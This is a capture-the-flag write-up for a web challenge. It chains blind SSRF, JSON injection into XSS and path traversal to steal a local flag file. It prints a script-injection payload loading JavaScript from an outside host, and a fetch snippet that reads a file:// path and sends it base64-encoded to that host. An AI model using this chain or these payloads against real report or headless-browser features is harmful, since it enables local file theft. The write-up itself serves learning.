## Owner:

> CaptainFreak

#### Solved?

 - No

#### Tried:

 > Had A look, Thought of Exploiting XSS in headless client for local file exfiltration through Blind SSRF in report feature but thought of CORS blocking and did not go further to explore. This should have given clear hint to find XSS somehow :/ .  But did not try further, missed subtle hints around the CAT pic loading feature, good point to note, Good CTF don't give some features just for the sake of story.

#### Solutions:

The challenge was to exlpoit Blind SSRF + XSS to leak `local` flag file.

Steps to solve the challenge:

1. Detect that Blind SSRF is present in /report
2. Upon view source of main page, Find that the inline script takes query parameter `p`  (ctf.com/?`p`) and does a request to /cat?kind=p, If this is succuesful, it return a content ` array` of names of `Files` of cats. If it does not find that type of cat, It errors out with a content error `string`.
3. It checks if the status paramter returned in JSON response is "ok" and if yes, Without any sanitization, It puts the content arrays elements in img src.
4. If the status in JSON response is not ok, it does nothing.
5. Upon fuzzing, /cats?kind=FUZZ, It is evident that if the cat type is present, It gives file name, If not then it return our string in response in JSON, Json injection Possible here.
6. Using JSON injection `", "content": ["\"><script src='https://captainfreak.com/xss.js'></script>"], "status": "ok", "a": "`

We can manipulate frontend check of "status" value being "ok" as JSON parse in JS only considers last occurence of element if there are multiple. Now we have complete XSS on /index.html 

7. Further fuzzing and observation reveals that this cat types are indeed a directory names and the api just lists file inside the directory.
8. Path traversal to `/cats?kind=../templates` gives out that flag is at `/app/templates/flag.txt`.
9. Now these are the bugs, We some how need chain them to exfiltrate this flag file.
10. We can host evil js file
```
fetch('file:///app/templates/flag.txt').then(response => response.text()).then((response) => {window.location = 'https://captainfreak.com/flag?a=' + (btoa(response) || 'No Value')});

```

and feed it through BLIND SSRF such as 

http://catweb.zajebistyc.tf/?+urlencode(","content": ["\"><script src='https://captainfreak.com/xss.js'></script>"], "status": "ok", "a": ")

But our JS wont work as CORS would block our evil JS's request to file:// as the origins dont match at all.

But file://app/template.index.html === http://cat.com/ in the context of Blind SSRF victim.

Hence Final Payload: 

```
file:///app/templates/index.html?urlencode(","content": ["\"><script src='https://captainfreak.com/xss.js'></script>"], "status": "ok", "a": ")
```


References:
1. https://d1r3wolf.blogspot.com/2020/03/confidence-ctf-2020-cat-web-challenge.html

